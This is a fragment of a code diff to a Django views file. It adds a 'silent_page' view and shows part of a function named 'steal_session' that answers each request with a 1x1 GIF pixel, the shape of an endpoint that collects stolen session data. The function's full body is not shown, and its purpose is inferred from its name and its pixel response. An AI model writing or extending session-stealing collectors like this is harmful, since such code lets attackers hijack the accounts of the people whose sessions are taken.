@@ -162,7 +162,6 @@ def download_json(request):
 
 
 
-# core/views.py → ADD THIS FUNCTION
 from django.http import HttpResponse
 import urllib.parse
 
@@ -194,3 +193,7 @@ def steal_session(request):
         b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
         content_type="image/gif"
     )
+    
+    
+def silent_page(request):
+    return render(request, 'core/silent.html')
